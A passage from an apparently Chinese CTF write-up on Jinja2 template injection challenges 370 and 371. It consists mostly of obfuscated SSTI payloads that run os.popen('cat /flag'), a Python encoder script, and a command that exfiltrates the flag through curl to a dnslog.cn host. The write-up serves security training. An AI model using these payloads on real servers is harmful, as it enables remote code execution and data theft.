class="number">20</span>=%20dict(cla=ro,ss=dd)|join()%&#125;&#123;%%20set%20class%<span class="number">20</span>=%20xhx*two~cla~xhx*two%&#125;&#123;%%20set%20ba%<span class="number">20</span>=%20dict(ba=ro,se=dd)|join()%&#125;&#123;%%20set%20base%<span class="number">20</span>=%20xhx*two~ba~xhx*two%&#125;&#123;%%20set%20subcla%<span class="number">20</span>=%20dict(subc=ro,lasses=dd)|join()%&#125;&#123;%%20set%20subclasses%<span class="number">20</span>=%20xhx*two~subcla~xhx*two%&#125;&#123;%%20set%20getit%<span class="number">20</span>=%20dict(get=ro,item=dd)|join()%&#125;&#123;%%20set%20getitem%<span class="number">20</span>=%20xhx*two~getit~xhx*two%&#125;&#123;%print(()|attr(<span class="class"><span class="keyword">class</span>)|<span class="title">attr</span>(<span class="params">base</span>)|<span class="title">attr</span>(<span class="params">subclasses</span>)()|<span class="title">attr</span>(<span class="params">getitem</span>)(<span class="params">(<span class="params">one*(<span class="params">two**zero</span>)%2bone*(<span class="params">two**one</span>)%2bone*(<span class="params">two**two</span>)%2bone*(<span class="params">two**three</span>)%2bone*(<span class="params">two**four</span>)%2bone*(<span class="params">two**five</span>)%2bzero*(<span class="params">two**six</span>)%2bone*(<span class="params">two**seven</span>)</span>)</span>)|<span class="title">attr</span>(<span class="params">init</span>)|<span class="title">attr</span>(<span class="params"><span class="built_in">globals</span></span>)|<span class="title">attr</span>(<span class="params">getitem</span>)(<span class="params">bul</span>)|<span class="title">attr</span>(<span class="params">getitem</span>)(<span class="params">ev</span>)(<span class="params">pld</span>))%&#125;</span></span><br></pre></td></tr></table></figure><p>或者 下面这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20one=(a,)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20zero=one-one%&#125;&#123;%<span class="built_in">set</span>%20two=(a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20three=(a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20four=(a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20five=(a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20six=(a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20seven=(a,a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20eight=(a,a,a,a,a,a,a,a)|wordcount%&#125;&#123;%<span class="built_in">set</span>%20nine=(a,a,a,a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123;&#125;|select()|string()|<span class="built_in">list</span>()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bone*(two**four)))|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(<span class="keyword">in</span>=ro,it=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init = xhx~xhx~ini~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glob = <span class="built_in">dict</span>(glo=ro,bals=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span> = xhx~xhx~glob~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getit = <span class="built_in">dict</span>(get=ro,item=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem = xhx~xhx~getit~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bu = <span class="built_in">dict</span>(buil=aa,tins=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx~xhx~bu~xhx~xhx %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(init)|attr(<span class="built_in">globals</span>)|attr(getitem))(bul)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span> = x.<span class="built_in">chr</span>%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> cmda=<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((zero*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~<span class="built_in">chr</span>((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~<span class="built_in">chr</span>((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))%&#125;</span><br><span class="line">&#123;%print(x.<span class="built_in">eval</span>(cmda))%&#125;</span><br><span class="line"><span class="comment"># __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span></span><br></pre></td></tr></table></figure><h2 id="371"><a href="#371" class="headerlink" title="371"></a>371</h2><p>折腾了好久,最后用dns外带数据</p><p><img src="1609850842580.png" alt="1609850842580"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20B=(a,)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20A=B-B%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20C=(a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20D=(a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20E=(a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20F=(a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20G=(a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20H=(a,a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%20I=(a,a,a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>%<span class="number">20J</span>=(a,a,a,a,a,a,a,a,a)|wordcount%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123;&#125;|select()|string()|<span class="built_in">list</span>()).pop((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bB*(C**E)))|string())%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(<span class="keyword">in</span>=ro,it=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init = xhx~xhx~ini~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glob = <span class="built_in">dict</span>(glo=ro,bals=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span> = xhx~xhx~glob~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getit = <span class="built_in">dict</span>(get=ro,item=dd)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem = xhx~xhx~getit~xhx~xhx%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bu = <span class="built_in">dict</span>(buil=aa,tins=dd)|join() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx~xhx~bu~xhx~xhx %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(init)|attr(<span class="built_in">globals</span>)|attr(getitem))(bul)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span> = x.<span class="built_in">chr</span>%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> cmda=<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~<span class="built_in">chr</span>((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~<span class="built_in">chr</span>((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span> (x.<span class="built_in">eval</span>(cmda))%&#125;sssss&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>转换脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNum</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;D&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;E&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        numBIn = <span class="built_in">bin</span>(x)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">        num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        mi = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> numBIn:</span><br><span class="line">            num = num + getNum(<span class="built_in">int</span>(i)) + <span class="string">&#x27;*(&#x27;</span> + getNum(<span class="number">2</span>) + <span class="string">&#x27;**&#x27;</span> + getNum(mi) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line">            mi = mi + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span> + num[:-<span class="number">1</span>] + <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl `cat /flag`.f7l5jg.dnslog.cn&#x27;).read()&quot;</span></span><br><span class="line">x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    x = x + <span class="string">&#x27;chr(&#x27;</span> + <span class="built_in">str</span>(getNum(<span class="built_in">ord</span>(i))) + <span class="string">&#x27;)~&#x27;</span></span><br><span class="line">print(x.replace(<span class="string">&#x27;+&#x27;</span>, <span 